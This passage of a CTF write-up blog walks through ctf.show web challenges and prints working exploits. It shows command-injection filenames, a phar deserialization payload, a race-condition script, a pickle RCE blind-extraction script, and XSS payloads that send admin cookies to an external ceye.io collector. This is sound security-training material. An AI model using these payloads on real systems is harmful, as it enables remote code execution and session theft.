class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>filter类的__destruct方法会执行system函数，我们只要用;隔开rm并且filename中有php就可以进行rce了</p><p>令filename=1.php;tac flag.php</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fn=php;tac flag.php</span><br></pre></td></tr></table></figure><h3 id="web276-phar反序列化"><a href="#web276-phar反序列化" class="headerlink" title="web276(phar反序列化)"></a>web276(phar反序列化)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile &amp;&amp; <span class="keyword">$this</span>-&gt;admin)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题考察 phar 反序列化，知识了解<code>https://www.freebuf.com/articles/web/305292.html</code></p><blockquote><p>Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的<code>meta-data</code>。以扩展反序列化漏洞的攻击面，配合<code>phar://</code>协议使用。</p></blockquote><p>需要先写入phar包，然后条件竞争在其被删除前通过 phar:// 使其反序列化来命令执行</p><p>前置知识：</p><p>phar包在被可执行代码的文件包含函数通过 phar:// 处理时会反序列化</p><p>解题：</p><p>先在 php.ini 配置 phar.readonly = Off</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web276.png"></p><p>通过PHP脚本生成phar包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;1;cat f*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>利用Python脚本进行条件竞争：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://3600b060-7945-4e79-8d32-6bb587192e04.challenge.ctf.show/&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span> <span class="comment"># 写入phar.phar</span></span><br><span class="line">    requests.post(url+<span class="string">&#x27;?fn=phar.phar&#x27;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unserialize</span>():</span> <span class="comment"># 触发反序列化</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.get(url+<span class="string">&#x27;?fn=phar://phar.phar&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag: <span class="comment"># 线程条件竞争，直到读到flag</span></span><br><span class="line">    threading.Thread(target = write).start()</span><br><span class="line">    threading.Thread(target = unserialize).start()</span><br></pre></td></tr></table></figure><p>将 .phar 文件和 python 放在同一目录下</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web276-1.png"></p><h3 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h3><p>查看页面源代码</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web277.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/backdoor?data=m=base64.b64decode(data) m=pickle.loads(m)</span><br></pre></td></tr></table></figure><p>考点应该是是<code>pickle</code>反序列化</p><blockquote><p>python反序列化和php反序列化类似（还没接触过java），相当于把程序运行时产生的变量，字典，对象实例等变换成字符串形式存储起来，以便后续调用，恢复保存前的状态</p><p>python中反序列化的库主要有两个，<code>pickle</code>和<code>cPickle</code>，这俩除了运行效率上有区别外，其他没啥区别</p></blockquote><p><code>pickle</code>的常用方法有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class="line"></span><br><span class="line"># pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本</span><br><span class="line"># 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。</span><br><span class="line"># 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。</span><br><span class="line"># pickle.dumps将对象反序列化为字符串</span><br><span class="line"># pickle.dump将反序列化后的字符串存储为文件</span><br><span class="line">print(pickle.dumps(a_list,protocol=0))</span><br><span class="line"></span><br><span class="line">pickle.loads() #对象反序列化</span><br><span class="line">pickle.load() #对象反序列化，从文件中读取数据</span><br></pre></td></tr></table></figure><p>wp写着使用 nc 反弹shell，但是怎么也不成功，所以这里我使用无回显sleep盲打脚本来弹出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web277</span></span><br><span class="line"><span class="comment"># time: 2023/11/9 17:03</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_-&#123;&#125;&quot;</span> + string.ascii_letters + string.digits  <span class="comment"># 大小写字母和数字</span></span><br><span class="line">url = <span class="string">&quot;http://5830736a-8f58-4368-a8dc-8a2957b9ab28.challenge.ctf.show/backdoor?data=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;if [ `cat /flag|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&#x27;).read()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rce</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, payload</span>):</span></span><br><span class="line">        self.code = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># print(self.code)</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (self.code,))</span><br><span class="line"></span><br><span class="line">length = <span class="number">50</span>  <span class="comment"># length长度</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        rser = <span class="built_in">bytes</span>.decode(base64.b64encode(pickle.dumps(Rce(payload.<span class="built_in">format</span>(j, n)))))</span><br><span class="line">        target = url + rser</span><br><span class="line">        <span class="comment"># print(target)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(target, timeout=(<span class="number">2.5</span>, <span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + n</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># if n==&#x27;9&#x27;:</span></span><br><span class="line">    <span class="comment"># key=1</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web277-1.png"></p><h3 id="web278-python反序列化"><a href="#web278-python反序列化" class="headerlink" title="web278(python反序列化)"></a>web278(python反序列化)</h3><p>使用上一题的脚本就可以，但是第一次得到的flag不对（原因未知，可能是网络延迟导致），可以多跑几次。</p><h2 id="XSS（316-333）"><a href="#XSS（316-333）" class="headerlink" title="XSS（316-333）"></a>XSS（316-333）</h2><h3 id="web316（反射型XSS盲打-↓↓↓）"><a href="#web316（反射型XSS盲打-↓↓↓）" class="headerlink" title="web316（反射型XSS盲打 ↓↓↓）"></a>web316（反射型XSS盲打 ↓↓↓）</h3><p>直接使用 payload打显示需要管理员身份才能得到flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web316.png"></p><p>那么我们需要使用 XSS 盲打了，找一个平台接收管理员cookie。网上其他平台都是打不到 cookie ，最终选择了知道创宇的平台(<code>http://ceye.io/</code>)，有时间可以自己搭建一个平台。</p><p>先注册一个账号，然后登录<code>https://sso.telnet404.com/cas/login/?next=/</code></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web316-2.png"></p><p>随后登录 CEYE 平台<code>http://ceye.io/</code>（更多用法查看<code>https://www.cnblogs.com/zhaijiahui/p/9160913.html</code>）,在profile 这里找到 identifier，这是一个ceyc域名</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web316-4.png"></p><p>然后就可以构造 XSS的 payload 了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>); img.src=<span class="string">&quot;http://你的ceye域名/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">-----------</span><br><span class="line"><span class="comment">//这是加载一张图片加上当前的cookie这里我们填写的是接收平台的地址，所以会带上 document.cookie去加载地址然后平台会有记录cookie的值ctf平台会有个虚拟机器人，充当admin的身份，每个一段时间点开网站它一点开就会加载payload，发送它自身的cookie在那个框内输入那个标签输进去，网站一加载就执行了我们输入的xss代码然后他自己会发送cookie</span></span><br></pre></td></tr></table></figure><p>这里还有别的一些 <code>payload</code>，当有防护时可以换别的 payload 绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">还有别的方法：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="built_in">window</span>.open</span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://你的ceye地址/&#x27;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>input</span><br><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>svg</span><br><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>iframe</span><br><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>body(下面的题用的大都是这个！！)</span><br><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>将 payload 放到这里点击生成链接，刷新等一会等待 bot 触发</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web316-5.png"></p><p>随后来到 HTTP Request 这里点击刷新(Reload)，cookie 中携带 <code>flag</code></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web316-1.png"></p><h3 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h3><p>使用上一题的 payload 打不到 cookie ，将 script 换成 body 就成功了，说明过滤了script，可能是过滤了 <code>&lt;script&gt;</code>，所以选择不带关键字的 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://bb9rcm.ceye.io/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web317.png"></p><h3 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h3><p>继续使用上一题的 payload</p><h3 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h3><p>继续使用上一题的 payload</p><h3 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h3><p>继续使用 payload 时不再出现弹窗效果，应该是又被过滤了什么</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://bb9rcm.ceye.io/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>测试发现 <code>=</code>右边的关键字依次删除后还是没有被打印出来，尖括号也不是原因，问题锁定在<code>body onload</code>上。</p><p>将尖括号和空格同时删除可以，将<code>body onload</code>全部删除也可以，单独去掉尖括号和单独去掉空格也不行，所以分别依次对尖括号和空格进行绕过</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web318.png"></p><p>最终只需要绕过空格即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用以下可以替代绕过空格</span><br><span class="line">TAB</span><br><span class="line">/</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body<span class="comment">/**/</span>onload=<span class="string">&quot;window.open(&#x27;http://bb9rcm.ceye.io/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h3><p>继续使用上一题的 payload</p><h3 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h3><p>继续使用上一题的 payload</p><h3 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h3><p>继续使用上一题的 payload</p><h3 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h3><p>继续使用上一题的 payload</p><h3 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h3><p>继续使用上一题的 payload</p><h3 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326</h3><p>继续使用上一题的 payload</p><h3 id="web327-存储型XSS-↓↓↓"><a href="#web327-存储型XSS-↓↓↓" class="headerlink" title="web327(存储型XSS ↓↓↓)"></a>web327(存储型XSS ↓↓↓)</h3><p>打开页面发现换题型了，现在是存储型XSS</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web327.png"></p><p>根据前面的操作，需要管理员 <code>admin</code> 才有flag，所以我们发信给 <code>admin</code>，用前面的 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body<span class="comment">/**/</span>onload=<span class="string">&quot;window.open(&#x27;http://bb9rcm.ceye.io/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web327-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web327-2.png"></p><p>查看ceye平台</p><p><img 